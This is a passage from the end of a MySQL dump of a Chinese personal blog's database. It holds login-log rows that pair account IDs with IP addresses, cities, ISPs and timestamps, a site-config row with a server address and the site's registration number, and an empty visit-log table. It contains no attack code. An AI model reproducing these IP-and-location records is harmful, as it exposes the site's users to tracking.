04:57:43'),('220506AMC8GZW7F8','220226DP09K1F0SW','河南省郑州市 联通','115.60.151.126','Unknown','Unknown','2022-05-06 06:56:04'),('220506FC2NBBD77C','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-06 12:13:18'),('220506FPHZSXS5AW','220226DP09K1F0SW','河南省郑州市 联通','115.60.151.126','Unknown','Unknown','2022-05-06 20:38:51'),('22050774D379S1D4','220226DP09K1F0SW','河南省郑州市 联通','115.60.146.48','Unknown','Unknown','2022-05-07 10:01:54'),('2205079GZC7H204H','220226DP09K1F0SW','河南省郑州市 联通','115.60.149.19','Unknown','Unknown','2022-05-07 13:24:37'),('220507BKSSNWN7C0','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-07 08:18:16'),('220508876AMSNK68','220226DP09K1F0SW','河南省郑州市 联通','115.60.150.17','Unknown','Unknown','2022-05-08 11:34:16'),('2205088798NKT25P','220226DP09K1F0SW','河南省郑州市 联通','115.60.150.17','Unknown','Unknown','2022-05-08 11:34:35'),('2205088FD8XAB3F8','12','河南省郑州市 联通','115.60.150.17','Unknown','Unknown','2022-05-08 11:56:01'),('2205088H59DZNF80','2205088H55FW0Y3C','河南省郑州市 联通','115.60.150.17','Chrome 10','Windows 10','2022-05-08 12:01:10'),('2205088MN65ZC6FW','2205088MN2A3X1P0','河南省郑州市 联通','115.60.150.17','Chrome 10','Windows 10','2022-05-08 12:08:40'),('2205088N7C0S4Z2W','2205088N7A8RWR68','河南省郑州市 联通','115.60.150.17','Chrome 10','Windows 10','2022-05-08 12:10:24'),('2205088NMFRM8ZC0','220226DP09K1F0SW','河南省郑州市 联通','115.60.150.17','Unknown','Unknown','2022-05-08 12:11:36'),('2205088PR1723D8H','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-08 04:14:52'),('220509D4N0C815YW','220226DP09K1F0SW','河南省郑州市 联通','115.60.148.237','Unknown','Unknown','2022-05-09 18:26:58'),('2205108903ZYHCBC','220226DP09K1F0SW','河南省郑州市 联通','115.60.146.45','Unknown','Unknown','2022-05-10 11:39:36'),('220510B3H2PSWY3C','220226DP09K1F0SW','河南省郑州市 联通','115.60.144.204','Unknown','Unknown','2022-05-10 15:35:30'),('220510BC920069KP','220226DP09K1F0SW','河南省郑州市 联通','115.60.144.204','Unknown','Unknown','2022-05-10 16:01:46'),('220510D6DHT3M5P0','220226DP09K1F0SW','河南省郑州市 联通','115.60.144.204','Unknown','Unknown','2022-05-10 18:32:23'),('2205119NNAP6DXWH','220226DP09K1F0SW','河南省郑州市 联通','115.60.150.54','Unknown','Unknown','2022-05-11 13:35:45'),('220511BMMNNRB7R4','220226DP09K1F0SW','河南省郑州市 联通','115.60.144.244','Chrome 10','Windows 10','2022-05-11 16:20:49'),('220511C5YNP7AA80','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-11 17:06:43'),('220511CAFWW1BY14','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-11 17:20:28'),('220512764NHCXBTC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-12 10:07:01'),('2205127F6XZ5SMCH','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-12 10:31:16'),('220512ARDHW01W6W','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-12 15:05:13'),('220512K19M520YRP','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Mobile Safari','Mac OS X (iPhone)','2022-05-12 23:53:14'),('220513AHB879HKYW','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-13 14:49:57'),('220513AHG8M9KFRP','2205088H55FW0Y3C','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-13 14:50:23'),('220513ANHH8SF894','2205088H55FW0Y3C','河南省郑州市 联通','115.60.145.33','Chrome 10','Windows 10','2022-05-13 14:59:32'),('220513ANHNCMDZ54','220226DP09K1F0SW','河南省郑州市 联通','115.60.145.33','Unknown','Unknown','2022-05-13 14:59:32'),('220513DBANP6PCPH','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-13 18:47:05'),('2205148FK4WCFBHH','220226DP09K1F0SW','河南省郑州市 联通','115.60.144.89','Unknown','Unknown','2022-05-14 11:56:26'),('220514F8TW29XPM8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-14 20:03:34'),('220515C7WMK4KXGC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-15 17:12:30'),('220516A5AY0G3GHH','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-16 14:16:53'),('220516DRM0H34SW0','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-16 19:17:54'),('220517BR2K3P61S8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-17 16:28:06'),('2205188NXYX8ZYA8','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-18 12:12:23'),('2205198WT0NTN7R4','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-19 12:27:05'),('220519DPBACG69YW','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-19 19:14:11'),('220520C5Z220X2NC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Unknown','Unknown','2022-05-20 17:06:45'),('220520DYZ27STYNC','220226DP09K1F0SW','广东省广州市 BGP','106.12.136.221','Chrome 10','Windows 10','2022-05-20 19:33:53');
/*!40000 ALTER TABLE `t_user_login_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_web_config`
--

DROP TABLE IF EXISTS `t_web_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_web_config` (
  `id` varchar(32) DEFAULT NULL,
  `logo` varchar(255) DEFAULT NULL,
  `name` varchar(12) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `author` varchar(12) DEFAULT NULL,
  `record_num` varchar(32) DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT NULL,
  `update_time` timestamp NULL DEFAULT NULL,
  `title` varchar(255) DEFAULT NULL,
  `login_type_list` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_web_config`
--

LOCK TABLES `t_web_config` WRITE;
/*!40000 ALTER TABLE `t_web_config` DISABLE KEYS */;
INSERT INTO `t_web_config` VALUES ('a331e4933cf54afcbb8c0cb11ec0830e','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJjzleAQZ7hAAI1YSuMjNo78.blob','流金岁月博客','流金岁月博客','zqw',' 豫ICP备2020030311号-1','2018-11-17 00:15:27','2022-04-27 04:14:25','流金岁月','[,1,2,3,4,5]');
/*!40000 ALTER TABLE `t_web_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_web_visit`
--

DROP TABLE IF EXISTS `t_web_visit`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_web_visit` (
  `id` varchar(32) DEFAULT NULL,
  `user_id` varchar(32) DEFAULT NULL,
  `ip` varchar(32) DEFAULT NULL,
  `create_time` timestamp NULL DEFAULT NULL,
  `update_time` timestamp NULL DEFAULT NULL,
  `os` mediumtext,
  `browser` mediumtext,
  `ip_source` mediumtext
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='Web访问记录表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_web_visit`
--

LOCK TABLES `t_web_visit` WRITE;
/*!40000 ALTER TABLE `t_web_visit` DISABLE KEYS */;
/*!40000 ALTER TABLE `t_web_visit` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-05-20 19:45:15
